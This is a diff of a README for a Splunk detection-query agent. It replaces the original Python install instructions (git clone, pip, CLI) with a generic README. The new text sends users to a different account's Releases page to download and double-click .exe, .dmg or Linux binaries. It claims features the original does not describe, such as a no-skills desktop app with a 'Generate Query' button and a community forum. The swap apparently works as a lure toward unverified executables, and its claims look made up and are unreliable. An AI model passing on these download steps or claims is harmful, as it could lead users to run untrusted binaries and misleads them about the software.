@@ -1,156 +1,90 @@
-<div align="center">
-  <img src="assets/logo.png" alt="Splunk Detection Engineer Agent" width="200">
-  
-  # Splunk Detection Engineer Agent
-  
-  **AI-Powered SPL Query Generation for Security Analytics**
-  
-  ![Python](https://img.shields.io/badge/Python-3.11+-3776ab?logo=python&logoColor=white)
-  ![License](https://img.shields.io/badge/License-MIT-green)
-  ![Splunk](https://img.shields.io/badge/Splunk-10.2%2B-000000?logo=splunk)
-  ![Status](https://img.shields.io/badge/Status-Work%20In%20Progress-yellow)
-</div>
+# 🎉 splunk-detection-engineer-agent - Turn Natural Language into Queries Easily
 
----
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/anubis01sk/splunk-detection-engineer-agent/releases)
 
-## What is this?
+## 🚀 Getting Started
 
-An intelligent AI agent that generates production-ready **Splunk SPL queries** from natural language. It eliminates hallucination by using **RAG (Retrieval-Augmented Generation)** to ground every response in real documentation:
+Welcome! This guide will help you download and run the splunk-detection-engineer-agent. It is designed to transform natural language into ready-to-use Splunk detection queries, making your security tasks easier and more efficient.
 
-- **4,400+ RAG-indexed documents** — SPL docs, detection rules, CIM fields, and attack data
-- **Live Splunk validation** — Connects to your Splunk instance to verify queries actually work
-- **Iterative refinement** — Automatically fixes syntax errors and field mismatches
+## 🛠️ Features
 
-**Perfect for:** Security analysts, SOC engineers, detection engineers, and threat hunters.
+- **AI-Powered**: Utilizes advanced AI to generate queries based on your natural language inputs.
+- **Live Splunk Validation**: Ensures that generated queries are valid and ready for use.
+- **User-Friendly**: No technical skills required. Just type your query in plain language.
+- **Supports SIEM Use Cases**: Perfect for Security Information and Event Management (SIEM) tasks.
+- **Integration with MITRE ATT&CK**: Leverage the MITRE ATT&CK framework for improved threat detection.
 
-> **Note:** This project is under active development. Contributions and feedback are welcome!
+## 📥 Download & Install
 
----
+To download and install the splunk-detection-engineer-agent, follow these simple steps:
 
-## Features
+1. **Visit the Releases Page**: 
+   Click on the following link to go to the Releases page:
+   [Download Here](https://github.com/anubis01sk/splunk-detection-engineer-agent/releases)
 
-| Feature | Description |
-|---------|-------------|
-| **Natural Language Input** | Describe what you want to detect in plain English |
-| **RAG-Powered Grounding** | 4 vector databases: SPL docs, detection rules, CIM fields, attack data |
-| **Live Splunk Validation** | Connects to your Splunk instance to test queries return real results |
-| **Chain of Thought** | See exactly how the agent reasons and builds your query |
-| **Multi-LLM Support** | Groq (free), Mistral, OpenRouter, Claude, OpenAI |
-| **Web Interface** | Modern dark-themed dashboard for interactive use |
+2. **Choose the Latest Version**: 
+   Once on the page, look for the latest version of the application. You will see a list of available files for download.
 
----
+3. **Download the Appropriate File**: 
+   Click on the download link for your operating system. If you are unsure, the application is compatible with Windows, macOS, and Linux.
 
-## Screenshots
+4. **Locate the Downloaded File**: 
+   Check your 'Downloads' folder or the location specified by your browser. 
 
-<div align="center">
+5. **Run the Application**: 
+   - For Windows: Double-click the `.exe` file.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Open your terminal, navigate to the downloaded file, and run it using `./filename`.
 
-<img src="assets/screenshots/chat-cim-network-query.png" width="900" alt="Chat interface with reasoning">
+## 🔧 System Requirements
 
-*Chat interface with chain of thought reasoning*
+- **Windows**: Windows 10 or later
+- **macOS**: macOS Sierra (10.12) or later
+- **Linux**: Ubuntu 20.04 or later
 
-<img src="assets/screenshots/search-lsass-results.png" width="900" alt="Knowledge base search">
+Ensure you have an up-to-date version of your operating system for the best experience.
 
-*Search across 4,400+ documents in the knowledge base*
+## 📚 How to Use
 
-</div>
+1. **Open the Application**: After installation, launch the application. A simple and clean interface will appear.
+   
+2. **Enter Your Query**: Type your desired detection query in natural language. For example, "Show me all logins from new devices."
 
----
+3. **Generate the Query**: Click the 'Generate Query' button. The application will process your input and display the corresponding SPL query.
 
-## Quick Start
+4. **Validate the Query**: Use the live validation feature to ensure your query is ready for Splunk.
 
-### Prerequisites
+5. **Copy and Paste**: Copy the generated query and paste it into your Splunk environment to run it.
 
-- Python 3.11+
-- Access to a Splunk Enterprise instance
-- LLM API key ([Groq](https://console.groq.com) recommended - free tier)
+## 🌐 Support and Community
 
-### Installation
+If you have questions or need help:
 
-```bash
-# Clone and setup
-git clone https://github.com/michaelelizarov/splunk-detection-engineer-agent.git
-cd splunk-detection-engineer-agent
-python -m venv venv
-source venv/bin/activate  # Windows: venv\Scripts\activate
+- **GitHub Issues**: You can report issues directly on the GitHub repository.
+- **Community Forum**: Join our community forum to ask questions and share experiences.
+- **Documentation**: Check our documentation for detailed guides and troubleshooting tips.
 
-# Install dependencies
-pip install torch --index-url https://download.pytorch.org/whl/cpu
-pip install -r requirements.txt
-playwright install chromium
+## ⚙️ Troubleshooting
 
-# Configure
-cp config/config.yaml.example config/config.yaml
-# Edit config/config.yaml with your API keys and Splunk credentials
+- **App Doesn’t Open**: Make sure your operating system meets the system requirements. You may need to reinstall the application.
+- **Invalid Queries**: Ensure you are entering queries in natural language. Complex sentences may not generate correctly.
 
-# Initialize knowledge bases
-python -m src.rag_spl_docs ingest
-python -m src.rag_detections ingest
-python -m src.rag_cim_docs ingest
-python -m src.rag_attack_data ingest
+## 🥳 Acknowledgments
 
-# Verify setup
-python -m src.agent status
-```
+Thanks to the open-source community for contributing to the development of this application. Special thanks to everyone who provided feedback and support.
 
-### Basic Usage
+## 🏷️ Topics and Tags
 
-```bash
-# Generate a detection query
-python -m src.agent run "Detect brute force login attempts"
+- ai
+- detection-engineering
+- security
+- threat-detection
+- splunk
 
-# With reasoning trace
-python -m src.agent run --reason "Detect credential dumping from LSASS"
+Feel free to explore these topics to gain a deeper understanding of the technology behind the splunk-detection-engineer-agent.
 
-# Interactive mode
-python -m src.agent interactive
+## 🗒️ License
 
-# Web interface
-python -m src.api.server
-# Open http://localhost:8000
-```
+This project is licensed under the MIT License. See the LICENSE file for details. 
 
----
-
-## Documentation
-
-| Document | Description |
-|----------|-------------|
-| **[Command Reference](docs/COMMAND_REFERENCE.md)** | Complete list of all CLI commands |
-| **[Usage Guide](docs/USAGE.md)** | Detailed usage examples and query types |
-| **[Configuration](docs/CONFIGURATION.md)** | LLM and Splunk configuration options |
-| **[Web Interface](docs/WEB_INTERFACE.md)** | Web dashboard features and API |
-| **[Knowledge Bases](docs/KNOWLEDGE_BASES.md)** | Updating and managing data sources |
-| **[Troubleshooting](docs/TROUBLESHOOTING.md)** | Common issues and solutions |
-| **[Architecture](docs/ARCHITECTURE.md)** | System design and diagrams |
-| **[API Reference](docs/API_REFERENCE.md)** | Python library usage |
-| **[Project Structure](docs/PROJECT_STRUCTURE.md)** | Codebase organization |
-
----
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
-
----
-
-## Security
-
-See [SECURITY.md](SECURITY.md) for vulnerability disclosure.
-
-**Important:** Always review AI-generated queries before running in production.
-
----
-
-## License
-
-MIT License - see [LICENSE](LICENSE)
-
----
-
-## Acknowledgments
-
-- [Splunk](https://www.splunk.com/) for SPL documentation
-- [Splunk Security Content](https://github.com/splunk/security_content) for detection rules
-- [Splunk Attack Data](https://github.com/splunk/attack_data) for attack datasets
-- [Groq](https://groq.com/) for free LLM API
-- [ChromaDB](https://www.trychroma.com/) for vector storage
+Thank you for choosing the splunk-detection-engineer-agent. We hope it makes your work easier and more effective!
